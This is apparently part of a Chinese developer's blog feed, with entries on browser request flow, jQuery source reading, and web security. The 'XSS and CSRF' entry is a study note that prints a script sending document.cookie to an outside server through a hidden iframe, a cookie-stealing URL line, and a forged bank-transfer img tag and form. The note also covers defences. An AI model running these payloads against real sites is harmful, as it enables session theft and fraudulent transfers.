+&lt;h1 id=&quot;前后端通信&quot;&gt;&lt;a href=&quot;#前后端通信&quot; class=&quot;headerlink&quot; title=&quot;前后端通信&quot;&gt;&lt;/a&gt;前后端通信&lt;/h1&gt;&lt;p&gt;先从一道面试题开始：&lt;br&gt;在面试的时候经常被问，当我们在浏览器地址栏中输入一个URL地址,到最后看到页面,中间都经历了哪些事情?&lt;br&gt;我们从客户端和服务器交互模型角度来回答这个问题：&lt;br&gt;假设我们访问的是 &lt;a href=&quot;https://www.baidu.com/这个地址&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.baidu.com/这个地址&lt;/a&gt; ，回车键之后，我们可以看到的百度页面&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;百度页面并没用在我们自己的客户端本地，我们输入地址之后，才请求过来的&lt;/li&gt;
+&lt;li&gt;输入不同的域名可以看到不同的页面&lt;/li&gt;
+&lt;li&gt;有的网址是https:,有的是http(也有ftp)&lt;/li&gt;
+&lt;li&gt;需要客户端联网才能完成这些事情&lt;br&gt;那这一过程都经历了什么事情呢？&lt;h2 id=&quot;request请求阶段&quot;&gt;&lt;a href=&quot;#request请求阶段&quot; class=&quot;headerlink&quot; title=&quot;request请求阶段&quot;&gt;&lt;/a&gt;request请求阶段&lt;/h2&gt;&lt;/li&gt;
+&lt;li&gt;首先根据客户端输入的域名，到DNS服务器上进行反解析(通过域名找到对应服务器的外网IP)&lt;/li&gt;
+&lt;li&gt;通过找到的外网IP，找到对应的服务器&lt;/li&gt;
+&lt;li&gt;通过在地址栏中输入的端口号(没有输入时因为不同协议有自己默认的端口号)找到服务器上发布的对应的项目&lt;h2 id=&quot;response响应阶段&quot;&gt;&lt;a href=&quot;#response响应阶段&quot; class=&quot;headerlink&quot; title=&quot;response响应阶段&quot;&gt;&lt;/a&gt;response响应阶段&lt;/h2&gt;&lt;/li&gt;
+&lt;li&gt;真正的服务器接收到响应，根据你的请求信息，进行资源的整理；并且把相应的资源通过HTTP返给客户端；(html,css，js返回的不是文件)&lt;/li&gt;
+&lt;li&gt;把从服务器请求过来的数据，资源进行整理；处理成浏览器可识别的文件；&lt;h2 id=&quot;浏览器自主渲染的过程&quot;&gt;&lt;a href=&quot;#浏览器自主渲染的过程&quot; class=&quot;headerlink&quot; title=&quot;浏览器自主渲染的过程&quot;&gt;&lt;/a&gt;浏览器自主渲染的过程&lt;/h2&gt;&lt;/li&gt;
+&lt;li&gt;先把HTML文件进行过滤解析，形成DOM树；节点与节点之间的一个组合&lt;/li&gt;
+&lt;li&gt;代码从上到下解析，形成CSS树；&lt;/li&gt;
+&lt;li&gt;把DOM树和css树进行重新组合，形成render树；是真正最后渲染的树；&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="http、TCP/IP" scheme="http://yoursite.com/tags/http%E3%80%81TCP-IP/"/>
+    
+      <category term="前后端通信" scheme="http://yoursite.com/tags/%E5%89%8D%E5%90%8E%E7%AB%AF%E9%80%9A%E4%BF%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>jQuery源码解读2</title>
+    <link href="http://yoursite.com/2018/08/14/jQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB2/"/>
+    <id>http://yoursite.com/2018/08/14/jQuery源码解读2/</id>
+    <published>2018-08-14T13:28:42.000Z</published>
+    <updated>2018-08-15T03:49:01.638Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></p><h1 id="构造jQuery对象"><a href="#构造jQuery对象" class="headerlink" title="构造jQuery对象"></a>构造jQuery对象</h1><p> jQuery对象是一个类数组对象，含有连续的整形属性、length属性和大量的jQuery方法。jQuery对象右构造函数jQuery创建，$()是jQuery()的缩写<br> <a id="more"></a></p><h2 id="构造函数jQuery"><a href="#构造函数jQuery" class="headerlink" title="构造函数jQuery"></a>构造函数jQuery</h2><p> 调用构造函数时传入的参数不同，创建jQuery对象的逻辑也会随之不同，构造函数有7种用法；</p><h3 id="jQuery-selector-context"><a href="#jQuery-selector-context" class="headerlink" title="jQuery(selector[,context])"></a>jQuery(selector[,context])</h3><p> 这个函数接收一个包含CSS选择器的字符串，然后用这个字符串去匹配一组元素。jQuery 的核心功能都是通过这个函数实现的。jQuery中的一切都基于这个函数，或者说都是在以某种方式使用这个函数。这个函数最基本的用法就是向它传递一个表达式（通常由CSS选择器组成），然后根据这个表达式来查找所有匹配的元素。默认情况下,如果没有指定context参数，$()将在当前的 HTML document中查找 DOM 元素；如果指定了 context 参数，如一个 DOM 元素集或 jQuery 对象，那就会在这个 context 中查找。在jQuery 1.3.2以后，其返回的元素顺序等同于在context中出现的先后顺序。</p><h3 id="jQuery-html-ownerDocument"><a href="#jQuery-html-ownerDocument" class="headerlink" title="jQuery(html,[ownerDocument])"></a>jQuery(html,[ownerDocument])</h3><p> 根据提供的原始 HTML 标记字符串，动态创建由 jQuery 对象包装的 DOM 元素。同时设置一系列的属性、事件等。<br> 你可以传递一个手写的HTML字符串，或者由某些模板引擎或插件创建的字符串，也可以是通过 AJAX 加载过来的字符串。但是在你创建 input 元素的时会有限制。当然这个字符串可以包含斜杠(比如一个图像地址)，还有反斜杠。当你创建单个元素时，请使用闭合标签或XHTML格式。例如，创建一个 span ，可以用$(“<span>“) 或 $(“<span></span>“) ，但不推荐 $(“<span>“)。在jQuery中，这个语法等同于$(document.createElement(“span”)) 。</span></span></p><h3 id="jQuery-element-、-elementArray"><a href="#jQuery-element-、-elementArray" class="headerlink" title="jQuery(element)、(elementArray)"></a>jQuery(element)、(elementArray)</h3><p> 如果传入一个DOM元素或者一个DOM元素数组，则将DOM元素封装成jQuery对象并返回，那么这个DOM元素就变成了jQuery对象，可以调用jQuery上的方法。<br>比如：在监听函数中，或者在事件中的this,$(this)之后，这个this就由原生的对象变成jQuery对象，就可以调用jQuery上的方法，比如sideUp、slideDown…<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#box"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="keyword">this</span>).slideUp();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="jQuery-Object"><a href="#jQuery-Object" class="headerlink" title="jQuery(Object)"></a>jQuery(Object)</h3><p> 传入一个普通的JavaScript对象，jQuery就会把这个JavaScript对象包装成jQuery对象并返回，方便在对象上绑定事件和方法</p><h3 id="jQuery-callback"><a href="#jQuery-callback" class="headerlink" title="jQuery(callback)"></a>jQuery(callback)</h3><p> 如果传入一个函数，则在document上绑定一个ready事件监听函数，ready事件的监听函数的触发要早于onload事件，ready事件的触发是在DOM结构加载完成时触发，而onload事件是在所有资源加载完成时触发。</p><h3 id="jQuery-jQuery-Object"><a href="#jQuery-jQuery-Object" class="headerlink" title="jQuery(jQuery Object)"></a>jQuery(jQuery Object)</h3><p>如果传入的是一个jQuery对象，则重新拷贝一份，将拷贝副本返回，这个副本跟原来的jQuery对象的用法是一样的，都可以调用jQuery上的方法。他们引用的是完全相同的DOM元素</p><h3 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery()"></a>jQuery()</h3><p> 如果不传入任何东西，则返回的是一个空的jQuery对象，它的length属性是0<br><img src="/images/构造函数jQuery.png" alt="构造函数的7个用法"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&quot;构造jQuery对象&quot;&gt;&lt;a href=&quot;#构造jQuery对象&quot; class=&quot;headerlink&quot; title=&quot;构造jQuery对象&quot;&gt;&lt;/a&gt;构造jQuery对象&lt;/h1&gt;&lt;p&gt; jQuery对象是一个类数组对象，含有连续的整形属性、length属性和大量的jQuery方法。jQuery对象右构造函数jQuery创建，$()是jQuery()的缩写&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="jQuery源码解读" scheme="http://yoursite.com/tags/jQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"/>
+    
+      <category term="jQuery" scheme="http://yoursite.com/tags/jQuery/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>jQuery源码解读1</title>
+    <link href="http://yoursite.com/2018/08/14/jQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB1/"/>
+    <id>http://yoursite.com/2018/08/14/jQuery源码解读1/</id>
+    <published>2018-08-14T05:50:14.000Z</published>
+    <updated>2018-08-15T03:46:44.626Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></p><h1 id="jQuery源码解读1"><a href="#jQuery源码解读1" class="headerlink" title="jQuery源码解读1"></a>jQuery源码解读1</h1><p>一万多行的jQuery源码着实让我恐惧，但是jQuery是一个优秀的JavaScript类库，里面封装的方法，jQuery源码里面把函数的三种身份变现的淋漓尽致、原型链、各种设计思想、让人不禁感叹编程之美。抱着提高编程能力和编程思想的目的，我把源码的注释删掉之后又鼓起勇气重新来看。边看边做下笔记。<br>先对jQuery做一下小的介绍：<br><a id="more"></a><br>首先，jQuery是一个优秀的JavaScript类库：<br>它提供了一些常用的方法，我们在开发项目的时候，随时可以引入这些类库，实现我们的业务需求。常用类库：jQuery(常用于PC端)，zepto(常用于移动端)。<br>相比于其他的类似UI组件、插件、框架有一定的不同点。<br> <strong>UI组件：</strong>UI组件：通过html css js组成，我们使用的时候，直接引入就可以了，常用的UI组件：bootstrap antDesign<br> <strong>插件：</strong>带有一定的业务逻辑。比如说选项卡插件，轮播图插件；我们在项目开发的时候，重复的业务可以用插件来替代；比如说常用的插件：swiper iscroll Echarts;<br> <strong>框架：</strong>它具有一定的编程思想，我们开发的时候需要按照它提供的编程思想进行开发，它提供了相对应的ui组件和功能插件，常用的框架有：React Vue Augular Backbone<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"> global, factory </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> <span class="built_in">module</span> === <span class="string">"object"</span> &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">module</span>.exports === <span class="string">"object"</span> ) &#123;</span><br><span class="line">        <span class="built_in">module</span>.exports = global.document ?</span><br><span class="line">            factory( global, <span class="literal">true</span> ) :</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"> w </span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> ( !w.document ) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>( <span class="string">"jQuery requires a window with a document"</span> );</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> factory( w );</span><br><span class="line">            &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        factory( global );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;(<span class="keyword">typeof</span> <span class="built_in">window</span> !== <span class="string">"undefined"</span> ? <span class="built_in">window</span> : <span class="keyword">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> window, noGlobal </span>) </span>&#123;</span><br><span class="line">....</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">typeof</span> noGlobal === strundefined ) &#123;</span><br><span class="line">        <span class="built_in">window</span>.jQuery = <span class="built_in">window</span>.$ = jQuery;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jQuery;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p><h2 id="自调用匿名函数”"><a href="#自调用匿名函数”" class="headerlink" title="自调用匿名函数”"></a>自调用匿名函数”</h2><p> 首先，源码一开始采用了闭包的方法，将代码放在了一个自执行函数中，这种方法称之为“自调用匿名函数”，当浏览器加载完成jQuery文件之后，就会立即执行该函数，初始化各个模块。</p><h3 id="为什么需要自调用匿名函数呢？"><a href="#为什么需要自调用匿名函数呢？" class="headerlink" title="为什么需要自调用匿名函数呢？"></a>为什么需要自调用匿名函数呢？</h3><p> 通过自调用匿名函数创建了一个特殊的作用域，保护里面的私有变量不受外界干扰，避免了全局变量污染的问题。由于jQuery会被应用在成千上万的代码中，为了防止命令以及变量的冲突，自调用函数的设计就防止了与外界变量的冲突。<br>那么，外界需要用到jQuery对象的话，应该怎么办呢？jQuery提供了一个出口，将jQuery对象暴露在全局对象window下,window.jQuery = window.$ = jQuery;也就是说，在外界只要执行jQuery或者$就可以使用jQuery对象封装的方法了。</p><h3 id="为什么自调用匿名函数需要传入window-global？和工厂函数？"><a href="#为什么自调用匿名函数需要传入window-global？和工厂函数？" class="headerlink" title="为什么自调用匿名函数需要传入window/global？和工厂函数？"></a>为什么自调用匿名函数需要传入window/global？和工厂函数？</h3><p> 因为在浏览器端的全局对象是window，如果程序跑在服务端的node环境下，全局变量是global，将全局变量作为参数传递进去时，jQuery对象就可以更快的访问到全局对象，另外，全局对象作为参数传递进去的时候，可以在代码压缩的时候进行优化;</p><h3 id="自调用匿名函数前后不能省略分号"><a href="#自调用匿名函数前后不能省略分号" class="headerlink" title="自调用匿名函数前后不能省略分号"></a>自调用匿名函数前后不能省略分号</h3><p> 如果没有给自调用匿名函数的末尾加上分号，那么下一个匿名函数的第一个括号会被当做函数来执行。比如<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)()</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)()</span><br><span class="line"><span class="comment">//undefined is not a function</span></span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&quot;jQuery源码解读1&quot;&gt;&lt;a href=&quot;#jQuery源码解读1&quot; class=&quot;headerlink&quot; title=&quot;jQuery源码解读1&quot;&gt;&lt;/a&gt;jQuery源码解读1&lt;/h1&gt;&lt;p&gt;一万多行的jQuery源码着实让我恐惧，但是jQuery是一个优秀的JavaScript类库，里面封装的方法，jQuery源码里面把函数的三种身份变现的淋漓尽致、原型链、各种设计思想、让人不禁感叹编程之美。抱着提高编程能力和编程思想的目的，我把源码的注释删掉之后又鼓起勇气重新来看。边看边做下笔记。&lt;br&gt;先对jQuery做一下小的介绍：&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="jQuery源码解读" scheme="http://yoursite.com/tags/jQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"/>
+    
+      <category term="jQuery@1.11.3" scheme="http://yoursite.com/tags/jQuery-1-11-3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;基于ES6封装一个自己的发布订阅库&#39;</title>
+    <link href="http://yoursite.com/2018/08/13/%E5%9F%BA%E4%BA%8EES6%E5%B0%81%E8%A3%85%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E5%BA%93/"/>
+    <id>http://yoursite.com/2018/08/13/基于ES6封装一个自己的发布订阅库/</id>
+    <published>2018-08-13T12:36:39.000Z</published>
+    <updated>2018-08-15T03:49:57.083Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;JS中常用的设计模式&#39;</title>
+    <link href="http://yoursite.com/2018/08/13/JS%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
+    <id>http://yoursite.com/2018/08/13/JS中常用的设计模式/</id>
+    <published>2018-08-13T10:31:58.000Z</published>
+    <updated>2018-08-15T03:49:13.564Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>新浪APP项目总结</title>
+    <link href="http://yoursite.com/2018/08/12/%E6%96%B0%E6%B5%AAAPP%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2018/08/12/新浪APP项目总结/</id>
+    <published>2018-08-12T05:04:42.000Z</published>
+    <updated>2018-08-15T03:50:05.044Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>QQ音乐项目总结</title>
+    <link href="http://yoursite.com/2018/08/12/QQ%E9%9F%B3%E4%B9%90%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2018/08/12/QQ音乐项目总结/</id>
+    <published>2018-08-12T05:03:51.000Z</published>
+    <updated>2018-08-15T03:49:27.141Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=474776122&auto=1&height=66"></iframe>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;/p&gt;
+&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; m
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>最美中国项目总结</title>
+    <link href="http://yoursite.com/2018/08/12/%E6%9C%80%E7%BE%8E%E4%B8%AD%E5%9B%BD%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2018/08/12/最美中国项目总结/</id>
+    <published>2018-08-12T04:06:12.000Z</published>
+    <updated>2018-08-15T03:50:13.107Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web安全之XSS和CSRF</title>
+    <link href="http://yoursite.com/2018/08/11/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E5%92%8CCSRF/"/>
+    <id>http://yoursite.com/2018/08/11/Web安全之XSS和CSRF/</id>
+    <published>2018-08-11T00:39:49.000Z</published>
+    <updated>2018-08-15T03:49:48.803Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span><br>今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧!<br><a id="more"></a></p><h1 id="Web安全之XSS和CSRF"><a href="#Web安全之XSS和CSRF" class="headerlink" title="Web安全之XSS和CSRF"></a>Web安全之XSS和CSRF</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="XSS定义"><a href="#XSS定义" class="headerlink" title="XSS定义"></a>XSS定义</h3><p><code>跨站脚本攻击</code>，通过客户端脚本语言在一个论坛发帖(其他<code>input</code>类型的输入框也可以)中发布一段恶意的<code>JavaScript</code>代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫<code>XSS！</code></p><h3 id="XSS跨站脚本攻击-Cross-site-Scipting"><a href="#XSS跨站脚本攻击-Cross-site-Scipting" class="headerlink" title="XSS跨站脚本攻击 Cross site Scipting"></a>XSS跨站脚本攻击 Cross site Scipting</h3><p>主要原因是多数用户的输入没有被转义，而直接执行。<br>XSS可以获取到用户cookie或隐私客户端信息。</p><h3 id="比如通过location-hash"><a href="#比如通过location-hash" class="headerlink" title="比如通过location.hash"></a>比如通过location.hash</h3><p>假设某个网站有一段脚本<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#box"</span>).html(location.hash.replace(<span class="string">'#'</span>,<span class="string">''</span>));</span><br></pre></td></tr></table></figure></p><p>攻击者看到伪造URL<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"http://a.com?"</span>+<span class="built_in">document</span>.cookie;获取用户cookie!</span><br></pre></td></tr></table></figure></p><p>也就是说<strong>它利用了网站的某个漏洞，然后把脚本注入该网页</strong>，让其他登录的用户登录后就会把该用户的信息获取到并发送给一个恶意的服务器。把压缩后的url发给某个登录的用户</p><h3 id="一个网页的评论有漏洞-没有转义"><a href="#一个网页的评论有漏洞-没有转义" class="headerlink" title="一个网页的评论有漏洞(没有转义)"></a>一个网页的评论有漏洞(没有转义)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    hideFrame.height = <span class="number">0</span>;</span><br><span class="line">    hideFrame.width = <span class="number">0</span>;</span><br><span class="line">    hideFrame.style.display = <span class="string">"none"</span>;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>那么这段代码就会被执行，这个代码会携带着登录用户的信息传输给<a href="http://192.168.123.123/myxss/" target="_blank" rel="noopener">http://192.168.123.123/myxss/</a>  服务器，然后服务器的代码就会接收了用户的隐式信息!<br>主要原理就是注入脚本到安全漏洞，然后发送给另外一个站点</p><h3 id="解决防范"><a href="#解决防范" class="headerlink" title="解决防范"></a>解决防范</h3><p>我们不需要用户输入HTML也是输入纯文本，转义是个很好的方法。可以用白名单重复处理。用户输入的HTML可能有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别</p><h2 id="CSRF：cross-site-Request-Forgery"><a href="#CSRF：cross-site-Request-Forgery" class="headerlink" title="CSRF：cross-site Request Forgery"></a>CSRF：cross-site Request Forgery</h2><p>跨站请求伪造：冒充用户发起请求，完成一些违背用户真实意愿的请求~</p><h2 id="CSRF可以做什么"><a href="#CSRF可以做什么" class="headerlink" title="CSRF可以做什么"></a>CSRF可以做什么</h2><p>你这可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义发送恶意请求。</strong><br><strong>CSRF能够做的事情包括：</strong>以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p><h2 id="CSRF原理图"><a href="#CSRF原理图" class="headerlink" title="CSRF原理图"></a>CSRF原理图</h2><p><img src="/images/web.png" alt="CSRF原理图"></p><h2 id="XSS和CSRF的关系"><a href="#XSS和CSRF的关系" class="headerlink" title="XSS和CSRF的关系"></a>XSS和CSRF的关系</h2><ul><li>CSRF更加强调一种形式，只要是伪造用户发起的请求都是CSRF攻击，而XSS更加强调是一种手段。 </li><li>CSRF可以是XSS实现，也可以是其他形式来伪造请求，只要是伪造了请求即CSRF。<br><strong>完成CSRF需要两个步骤：</strong> </li><li>1.登陆受信任的网站A，在本地生成 COOKIE </li><li>2.在不登出A的情况下，或者本地 COOKIE 没有过期的情况下，访问危险网站B。(也有可能B要求访问A网站)</li><li>CSRF不需要知道sessionid就能让用户中招。 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><img src="/2018/08/11/Web安全之XSS和CSRF/../../images/web.png" alt="Alt text"><br>CSRF在另一个网站构造一个表单提交，提交地址是a<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">'test'</span> method=<span class="string">'POST'</span> action=<span class="string">"http://a.com/guestbook"</span>/  &gt;</span><br></pre></td></tr></table></figure></li></ul><p>攻击者只要引导登录a的用户访问这个b网站，自动提交一个留言，这个提交到a网站的过程中，浏览器会将用户的cookie发送到服务器。</p><h2 id="三种攻击模式"><a href="#三种攻击模式" class="headerlink" title="三种攻击模式"></a>三种攻击模式</h2><p>假设B网站有一段HTML代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http:<span class="comment">//www.bank.com/Transfer.php?BankId=1122&amp;money=1000&gt;</span></span><br></pre></td></tr></table></figure></p><p>在你登录A网站的时候，会先获取资源，同时留下你的cooki。然后当你再去访问B网站的时候，B会通过img的src属性隐式发送请求给A网站，达到模拟你发送请求的目的，来获取你的资源以及信息。</p><h3 id="使用POST来完成敏感操作（更新数据）"><a href="#使用POST来完成敏感操作（更新数据）" class="headerlink" title="使用POST来完成敏感操作（更新数据）"></a>使用POST来完成敏感操作（更新数据）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"Transfer.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">　　　　&lt;p&gt;BankId: &lt;input type="text" name="toBankId" /&gt;&lt;/p&gt;</span><br><span class="line">　　　　&lt;p&gt;Money: &lt;input type="text" name="money" /&gt;&lt;/p&gt;</span><br><span class="line">　　　　&lt;p&gt;&lt;input type="submit" value="Transfer" /&gt;&lt;/p&gt;</span><br><span class="line">　　&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure><p>危险网站B，可以通过后台使用REQUEST去获取请求的数据，而_REQUEST既可以获取get请求的数据也可以获取post请求的数据</p><h4 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h4><p>在node.js中，可以处理post请求的URL后面参数部分<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 